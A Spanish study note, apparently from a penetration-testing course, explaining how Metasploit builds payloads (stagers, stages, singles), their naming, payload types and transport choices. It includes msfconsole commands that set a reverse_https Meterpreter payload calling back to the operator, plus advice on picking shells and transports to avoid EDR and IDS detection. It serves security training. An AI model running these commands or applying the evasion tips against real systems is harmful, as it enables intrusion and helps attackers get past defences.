---
tags:
  - Pentesting/Explotacion
  - Metasploit
  - Payloads
Fecha de actualización: 2026-07-18
Nota previa: "[[03 - Targets]]"
Nota siguiente: "[[05 - Encoders]]"
Area: "[[Metasploit.base|Metasploit]]"
---
---

El `payload` es el código que se ejecuta en el objetivo tras el exploit — lo que nos entrega la [[05 - Payloads con Metasploit y MSFvenom|shell]]. Ya lo usamos en Shells & Payloads; aquí, su estructura interna en Metasploit, que explica los comportamientos que de otro modo parecen caprichos.

# Singles, stagers y stages

MSF construye los payloads con tres tipos de piezas:

| Pieza | Qué es |
| --- | --- |
| `single` (inline) | Payload **autónomo y completo** en un solo bloque. Autosuficiente pero grande. |
| `stager` | Trozo **mínimo** que solo establece la conexión y descarga el resto. |
| `stage` | El **grueso** del payload (p. ej. Meterpreter), descargado por el stager. |

<mark style="background: #ADCCFFA6;">De aquí sale la distinción `stageless` (un single) vs `staged` (stager + stage)</mark>.

# Staged vs. stageless: el separador lo dice todo

```text
windows/x64/meterpreter/reverse_tcp     ← STAGED   (barra: stager + stage)
windows/x64/meterpreter_reverse_tcp     ← STAGELESS (guion bajo: todo en uno)
```

| | Staged (`/`) | Stageless (`_`) |
| --- | --- | --- |
| Tamaño inicial | Pequeño (cabe en buffers reducidos) | Grande |
| Robustez | Frágil si la red corta durante el *staging* | Más fiable en canales inestables |
| Detección | El *staging* genera tráfico reconocible | Un solo artefacto, mayor en disco |

<mark style="background: #8000E1A6;">Si una sesión "conecta y muere" al instante, sospecha de un *staged* que no completó etapas</mark> — prueba la variante stageless.

# Tipos de payload

No todo es Meterpreter. Según lo que necesites:

| Payload | Entrega |
| --- | --- |
| `meterpreter/...` | El agente in-memory de MSF ([[09 - Meterpreter]]) — potente pero **muy detectado** |
| `shell/...` | Una shell nativa del SO (`cmd`, `/bin/sh`) — más discreta, sin extras |
| `exec` | Ejecuta un comando concreto |
| `adduser` | Crea un usuario |
| `messagebox` | PoC inofensiva (demostrar RCE sin dar shell) |

<mark style="background: #FFB8EBA6;">`shell/...` es a menudo mejor elección que Meterpreter cuando hay EDR</mark>: menos funcionalidad, pero muchísima menos firma.

# La nomenclatura completa

```text
windows/x64/meterpreter/reverse_https
   │     │        │            │
   │     │        │            └── transporte (cómo conecta)
   │     │        └── tipo de payload
   │     └── arquitectura (x86 / x64)
   └── plataforma
```

# Elegir el transporte (OPSEC)

El último componente —el transporte— tiene implicaciones de detección grandes:

| Transporte | Nota |
| --- | --- |
| `reverse_tcp` | Básico, **texto plano** — el IDS ve el patrón. |
| `reverse_https` | <mark style="background: #FF5582A6;">Cifrado TLS: la mejor opción OPSEC</mark>, el contenido no es inspeccionable y se mezcla con tráfico web. |
| `reverse_http` | HTTP plano, útil para atravesar proxies. |
| `bind_tcp` | El objetivo escucha (raro hoy — ver [[02 - Bind shells\|bind shells]]). |

```shell-session
msf6 exploit(...) > show payloads              # compatibles con el módulo/target
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > set LPORT 443
```

> [!important]+ Coherencia payload ↔ handler ↔ target
> El `PAYLOAD` debe ser compatible con la **arquitectura del target** (`x64` payload para target x64) y, si recibes la sesión con un `multi/handler` aparte, el payload del handler debe coincidir **exactamente** con el generado. Un desajuste = sesión que no *stagea*.

Para generar estos mismos payloads como ficheros autónomos (`.exe`, `.elf`…) fuera de un exploit, está [[11 - MSFvenom|MSFvenom]]. Y por qué ya no basta con encodearlos para evadir AV, en la [[05 - Encoders|siguiente nota]].
